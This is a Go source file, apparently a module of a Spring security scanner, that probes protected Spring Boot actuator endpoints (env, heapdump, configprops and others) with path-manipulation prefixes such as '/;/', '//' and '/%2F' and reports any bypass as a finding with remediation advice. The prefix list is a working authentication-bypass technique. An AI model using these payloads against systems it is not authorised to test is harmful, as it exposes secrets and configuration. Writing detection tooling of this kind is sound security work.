package web

// Actuator auth bypass: tests various Spring Security misconfigurations
// that allow accessing protected actuator endpoints without authentication

import (
	"context"
	"fmt"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&ActuatorBypass{}) }

type ActuatorBypass struct{}

func (m *ActuatorBypass) ID() string               { return "actuator-auth-bypass" }
func (m *ActuatorBypass) Name() string             { return "Spring Actuator Auth Bypass" }
func (m *ActuatorBypass) CVSS() float64            { return 7.5 }
func (m *ActuatorBypass) Severity() models.Severity { return models.SeverityHigh }
func (m *ActuatorBypass) Tags() []string { return []string{"auth-bypass", "actuator", "spring-security", "exposure"} }
func (m *ActuatorBypass) Requirements() vulns.ModuleRequirements { return vulns.ModuleRequirements{} }
func (m *ActuatorBypass) Description() string {
	return "Tests path traversal and header injection techniques to bypass Spring Security rules protecting actuator endpoints."
}

var sensitiveActuators = []string{
	"actuator/env", "actuator/heapdump", "actuator/mappings",
	"actuator/beans", "actuator/logfile", "actuator/configprops",
	"actuator/threaddump", "actuator/httptrace", "actuator/auditevents",
}

var bypassPrefixes = []string{
	"",                    // baseline
	"/;/",                 // semicolon bypass (Tomcat)
	"//",                  // double slash
	"/./",                 // dot segment
	"/%2F",                // URL encoded slash
	"/api/../",            // path traversal
}

func (m *ActuatorBypass) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	var findings []*models.Finding

	for _, actuator := range sensitiveActuators {
		// First check if it returns 401/403 normally
		normalURL := utils.JoinURL(target.BaseURL, actuator)
		normalResp, err := client.Get(ctx, normalURL, nil)
		if err != nil {
			continue
		}
		if normalResp.StatusCode != 401 && normalResp.StatusCode != 403 {
			// Already accessible — will be caught by endpoint scanner
			continue
		}

		// Try bypass techniques
		for _, prefix := range bypassPrefixes[1:] {
			bypassURL := strings.TrimRight(target.BaseURL, "/") + prefix + actuator
			resp, err := client.Get(ctx, bypassURL, nil)
			if err != nil {
				continue
			}
			if resp.StatusCode != 200 && resp.StatusCode != 206 {
				continue
			}
			if len(resp.Body) < 10 {
				continue
			}

			f := &models.Finding{
				ID:          fmt.Sprintf("%s-%s-%d", m.ID(), actuator, time.Now().UnixNano()),
				Type:        models.FindingTypeVuln,
				Severity:    m.Severity(),
				CVSS:        m.CVSS(),
				Title:       fmt.Sprintf("Actuator Auth Bypass via Path Manipulation: %s", actuator),
				Description: m.Description(),
				URL:         target.BaseURL,
				Endpoint:    "/" + actuator,
				Method:      "GET",
				Evidence:    fmt.Sprintf("Bypass technique '%s' returned HTTP %d (normal: HTTP %d).", prefix, resp.StatusCode, normalResp.StatusCode),
				Payload:     bypassURL,
				Remediation: "Configure Spring Security to match all path variants. Use AntPathMatcher with pattern /actuator/**.",
				Tags:        m.Tags(),
				Timestamp:   time.Now(),
				ModuleID:    m.ID(),
			}
			findings = append(findings, f)
			break
		}
	}
	return findings, nil
}

func (m *ActuatorBypass) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
